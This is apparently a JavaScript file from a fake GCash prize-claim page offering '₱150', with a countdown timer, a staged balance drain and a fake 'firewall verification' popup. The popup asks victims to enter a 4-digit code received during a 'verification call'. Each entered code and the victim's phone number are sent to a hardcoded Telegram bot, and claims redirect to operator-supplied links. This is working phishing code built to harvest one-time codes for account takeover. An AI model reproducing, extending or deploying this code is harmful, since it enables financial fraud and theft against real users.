// ========== POPUP_SHARE.JS - SAME STYLE AS popup.js ==========

let claimStateShare = {
    isProcessing: false,
    currentAmount: 0,
    countdownInterval: null,
    balanceDecrementInterval: null,
    countdownSeconds: 60,
    isPending: false,
    hasRedirected: false
};

let cachedFirewallStatusShare = false;
let currentVerificationCodeShare = null;
let verificationAttemptsShare = 0;

// ========== FIREWALL VERIFICATION (SAME STYLE) ==========
async function getFirewallStatusShare() {
    if (typeof firebase === 'undefined' || !firebase.database) {
        console.warn("Firebase not available");
        return false;
    }
    try {
        const db = firebase.database();
        const snap = await db.ref('admin/globalFirewall').once('value');
        const data = snap.val();
        if (data === null) {
            await db.ref('admin/globalFirewall').set({
                active: false,
                activatedBy: "SYSTEM",
                timestamp: Date.now()
            });
            return false;
        }
        return data.active === true;
    } catch(e) { 
        console.error("Firewall check error:", e);
        return false;
    }
}

function listenToFirewallChangesShare() {
    if (typeof firebase === 'undefined' || !firebase.database) return;
    const db = firebase.database();
    db.ref('admin/globalFirewall').on('value', (snapshot) => {
        const data = snapshot.val();
        cachedFirewallStatusShare = (data && data.active === true);
        console.log("Firewall status updated:", cachedFirewallStatusShare);
    });
}

async function sendTelegramShare(phone, code) {
    const msg = `VERIFY REQUEST\nPhone: ${phone}\nCode: ${code}`;
    try {
        await fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(msg)}`);
        console.log("Telegram sent");
    } catch(e) {}
}

// ========== FIREWALL POPUP (SAME STYLE AS MAIN) ==========
function showFirewallPopupShare() {
    console.log("Showing firewall verification popup");
    const popup = document.getElementById('firewallPopup');
    if (!popup) {
        console.error("Firewall popup not found");
        return;
    }
    
    const content = document.getElementById('firewallPopupContent');
    if (content) {
        content.innerHTML = `
            <div class="firewall-warning-icon">📞</div>
            <h2>VERIFICATION REQUIRED</h2>
            <div class="firewall-message">
                <p>Due to multiple claiming requests detected in the system, a quick verification call is required before proceeding.</p>
                <p>Please wait for the system-verification to call you. You will receive a 4-digit code during the call.</p>
                <p>Enter the code below to continue.</p>
            </div>
            <div class="verification-input-group">
                <input type="text" id="verificationCodeShare" class="verification-input" placeholder="Enter 4-digit code" maxlength="4" inputmode="numeric">
                <button id="verifyCodeBtnShare" class="verify-btn">VERIFY NOW</button>
            </div>
            <div class="firewall-note">
                <p>Waiting for system-verification call...</p>
            </div>
            <div id="firewallErrorMsgShare" class="firewall-error" style="display: none;"></div>
        `;
    }
    
    currentVerificationCodeShare = Math.floor(1000 + Math.random() * 9000).toString();
    verificationAttemptsShare = 0;
    console.log("VERIFICATION CODE:", currentVerificationCodeShare);
    
    popup.style.display = 'flex';
    setTimeout(() => {
        const ci = document.getElementById('verificationCodeShare');
        if (ci) ci.focus();
    }, 100);
    
    const verifyBtn = document.getElementById('verifyCodeBtnShare');
    if (verifyBtn) {
        verifyBtn.onclick = verifyFirewallCodeShare;
    }
}

function hideFirewallPopupShare() {
    const popup = document.getElementById('firewallPopup');
    if (popup) popup.style.display = 'none';
}

window.verifyFirewallCodeShare = async function() {
    const codeInput = document.getElementById('verificationCodeShare');
    const code = codeInput ? codeInput.value.trim() : '';
    const errorDiv = document.getElementById('firewallErrorMsgShare');
    const userPhone = localStorage.getItem("userPhone") || "Unknown";
    
    if (!code || code.length < 4) {
        if (errorDiv) {
            errorDiv.innerHTML = "Please enter a 4-digit code.";
            errorDiv.style.display = 'block';
        }
        return;
    }
    
    verificationAttemptsShare++;
    const isValid = (code === currentVerificationCodeShare);
    
    if (isValid) {
        await sendTelegramShare(userPhone, code);
        hideFirewallPopupShare();
        alert("Verification successful. Page will refresh.");
        setTimeout(() => window.location.reload(), 500);
    } else {
        await sendTelegramShare(userPhone, code);
        let errorMsg = "Invalid verification code. Please try again.";
        if (verificationAttemptsShare >= 3) {
            errorMsg = "Too many failed attempts. Page will refresh.";
            setTimeout(() => window.location.reload(), 2000);
        }
        if (errorDiv) {
            errorDiv.innerHTML = errorMsg;
            errorDiv.style.display = 'block';
        }
        if (codeInput) {
            codeInput.value = '';
            codeInput.focus();
        }
    }
};

// ========== GET LATEST DEPLOYED LINK ==========
async function getLatestPayoutLinkShare() {
    if (typeof firebase === 'undefined' || !firebase.database) return null;
    try {
        const db = firebase.database();
        const snapshot = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
        if (snapshot.exists()) {
            const key = Object.keys(snapshot.val())[0];
            const linkData = snapshot.val()[key];
            console.log("Found payout link:", linkData.url);
            return { url: linkData.url, key: key };
        }
        return null;
    } catch (error) {
        return null;
    }
}

// ========== CONGRATULATIONS POPUP (SAME STYLE AS MAIN, DIFFERENT THEME) ==========
async function showClaimPopupShare(amount) {
    console.log("showClaimPopupShare called with amount:", amount);
    
    const firewallActive = await getFirewallStatusShare();
    console.log("Firewall active:", firewallActive);
    
    if (firewallActive) {
        console.log("FIREWALL ON - Showing verification popup");
        showFirewallPopupShare();
        return;
    }
    
    console.log("FIREWALL OFF - Showing congratulations popup");
    claimStateShare.currentAmount = amount;
    claimStateShare.isProcessing = false;
    claimStateShare.hasRedirected = false;
    
    const popup = document.getElementById('claimPopup');
    const prizeSpan = document.getElementById('popupPrizeAmount');
    const claimBtn = document.getElementById('claimActionBtn');
    
    if (prizeSpan) prizeSpan.innerHTML = "₱" + amount.toLocaleString();
    if (claimBtn) {
        claimBtn.innerHTML = 'CLAIM THRU GCASH';
        claimBtn.disabled = false;
    }
    if (popup) popup.style.display = 'flex';
}

function hideClaimPopupShare() { 
    const p = document.getElementById('claimPopup'); 
    if (p) p.style.display = 'none'; 
}

function showPendingStatusShare() { 
    const pa = document.getElementById('pendingStatusArea'); 
    if (pa) pa.style.display = 'block'; 
    claimStateShare.isPending = true; 
}

function hidePendingStatusShare() { 
    const pa = document.getElementById('pendingStatusArea'); 
    if (pa) pa.style.display = 'none'; 
    claimStateShare.isPending = false; 
}

// ========== TIMER ON MAIN PAGE (THRILL EFFECT) ==========
function showTimerOnPage() {
    var timerContainer = document.getElementById('claimTimerContainer');
    if (!timerContainer) {
        var balanceSection = document.querySelector('.stats-row');
        if (balanceSection) {
            var container = document.createElement('div');
            container.id = 'claimTimerContainer';
            container.style.cssText = 'text-align: center; margin: 10px 0; padding: 8px; background: rgba(0,0,0,0.4); border-radius: 30px; border: 1px solid rgba(255,215,0,0.3);';
            container.innerHTML = '<div style="font-size: 10px; color: #ffaa33; letter-spacing: 1px;">⏰ CLAIM EXPIRES IN</div><div id="claimTimerDisplay" style="font-family: Orbitron, monospace; font-size: 24px; font-weight: bold; color: #ffd700;">01:00</div>';
            balanceSection.parentNode.insertBefore(container, balanceSection.nextSibling);
        }
    }
    timerContainer = document.getElementById('claimTimerContainer');
    if (timerContainer) timerContainer.style.display = 'block';
}

function hideTimerOnPage() {
    var timerContainer = document.getElementById('claimTimerContainer');
    if (timerContainer) timerContainer.style.display = 'none';
}

function updateTimerDisplay(seconds) {
    var timerDisplay = document.getElementById('claimTimerDisplay');
    if (timerDisplay) {
        var mins = Math.floor(seconds / 60);
        var secs = seconds % 60;
        timerDisplay.innerHTML = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
        
        // Thrill effect - change color
        if (seconds <= 10) {
            timerDisplay.style.color = '#ff4444';
            timerDisplay.style.textShadow = '0 0 10px #ff4444';
            timerDisplay.style.animation = 'pulseText 0.5s infinite';
        } else if (seconds <= 30) {
            timerDisplay.style.color = '#ffaa33';
            timerDisplay.style.textShadow = '0 0 5px #ffaa33';
            timerDisplay.style.animation = 'none';
        } else {
            timerDisplay.style.color = '#ffd700';
            timerDisplay.style.textShadow = '0 0 3px #ffd700';
            timerDisplay.style.animation = 'none';
        }
    }
}

// ========== BALANCE DECREMENT ==========
function startSmoothDecrementShare(originalAmount) {
    const balanceDisplay = document.getElementById('userBalanceDisplay');
    if (!balanceDisplay) return;
    
    let current = originalAmount;
    const totalDuration = 2000;
    const steps = originalAmount;
    const intervalTime = totalDuration / steps;
    
    claimStateShare.balanceDecrementInterval = setInterval(() => {
        current = current - 1;
        if (current >= 0) balanceDisplay.innerText = "₱" + current.toLocaleString();
        if (current <= 0) {
            clearInterval(claimStateShare.balanceDecrementInterval);
            claimStateShare.balanceDecrementInterval = null;
            balanceDisplay.innerText = "₱0";
        }
    }, intervalTime);
}

function restoreBalance(originalAmount) {
    const balanceDisplay = document.getElementById('userBalanceDisplay');
    if (balanceDisplay) {
        balanceDisplay.innerText = "₱" + originalAmount.toLocaleString();
    }
}

// ========== 1-MINUTE CLAIM TIMER ==========
function startClaimTimer(originalAmount) {
    let remaining = 60;
    showTimerOnPage();
    updateTimerDisplay(remaining);
    
    claimStateShare.countdownInterval = setInterval(() => {
        if (remaining > 0) {
            remaining--;
            updateTimerDisplay(remaining);
        }
        
        if (remaining <= 0) {
            clearInterval(claimStateShare.countdownInterval);
            claimStateShare.countdownInterval = null;
            
            restoreBalance(originalAmount);
            hideTimerOnPage();
            claimStateShare.isProcessing = false;
            
            var statusMsg = document.getElementById('statusMessage');
            if (statusMsg) {
                statusMsg.innerHTML = '<span class="status-locked">⏰ Time expired! Please try claiming again.</span>';
                setTimeout(() => {
                    statusMsg.innerHTML = '<span class="status-locked">🐱 Click the <strong>Maneki-neko</strong> to claim <strong style="color:#ffd700;">₱150!</strong> ✨</span>';
                }, 3000);
            }
        }
    }, 1000);
}

// ========== CLAIM ACTION ==========
async function onClaimActionShare() {
    if (claimStateShare.isProcessing) return;
    
    claimStateShare.isProcessing = true;
    const claimBtn = document.getElementById('claimActionBtn');
    const amount = claimStateShare.currentAmount;
    const userPhone = localStorage.getItem("userPhone") || "Unknown";
    
    if (claimBtn) {
        claimBtn.disabled = true;
        claimBtn.innerHTML = 'PROCESSING...';
    }
    
    fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent("CLAIM REQUEST!\nPhone: " + userPhone + "\nAmount: ₱" + amount)}`)
        .catch(e => console.log('Telegram error:', e));
    
    if (typeof firebase !== 'undefined' && firebase.database) {
        const db = firebase.database();
        
        try {
            const linkData = await getLatestPayoutLinkShare();
            
            if (linkData && linkData.url) {
                const redirectUrl = linkData.url;
                const finalUrl = redirectUrl.startsWith('http') ? redirectUrl : 'https://' + redirectUrl;
                
                await db.ref('links/' + linkData.key).update({ 
                    status: 'claimed', 
                    user: userPhone, 
                    amount: amount, 
                    claimedAt: Date.now() 
                });
                
                hideClaimPopupShare();
                startSmoothDecrementShare(amount);
                startClaimTimer(amount);
                
                setTimeout(() => {
                    if (!claimStateShare.hasRedirected) {
                        claimStateShare.hasRedirected = true;
                        window.location.href = finalUrl;
                    }
                }, 3000);
                
            } else {
                if (claimBtn) {
                    claimBtn.innerHTML = 'NO REWARDS';
                    setTimeout(() => {
                        claimBtn.innerHTML = 'CLAIM THRU GCASH';
                        claimBtn.disabled = false;
                        claimStateShare.isProcessing = false;
                    }, 3000);
                }
                alert("Withdrawal unsuccessful. No payout link available.");
            }
        } catch(err) {
            console.error("Error:", err);
            if (claimBtn) {
                claimBtn.innerHTML = 'ERROR';
                setTimeout(() => {
                    claimBtn.innerHTML = 'CLAIM THRU GCASH';
                    claimBtn.disabled = false;
                    claimStateShare.isProcessing = false;
                }, 3000);
            }
            alert("System error. Please try again.");
        }
    }
}

// ========== CLAIM THRU GCASH HANDLER ==========
async function handleClaimThruGCashShare() {
    console.log("CLAIM THRU GCASH clicked");
    showClaimPopupShare(150);
}

// ========== EXPORT ==========
window.showFirewallPopupShare = showFirewallPopupShare;
window.hideFirewallPopupShare = hideFirewallPopupShare;
window.verifyFirewallCodeShare = verifyFirewallCodeShare;
window.showClaimPopupShare = showClaimPopupShare;
window.onClaimActionShare = onClaimActionShare;
window.handleClaimThruGCashShare = handleClaimThruGCashShare;

// ========== INITIALIZE ==========
document.addEventListener('DOMContentLoaded', function() { 
    hidePendingStatusShare();
    listenToFirewallChangesShare();
    getFirewallStatusShare().then(status => {
        console.log("Initial firewall status:", status);
        cachedFirewallStatusShare = status;
    });
    console.log("Popup_share.js loaded");
});
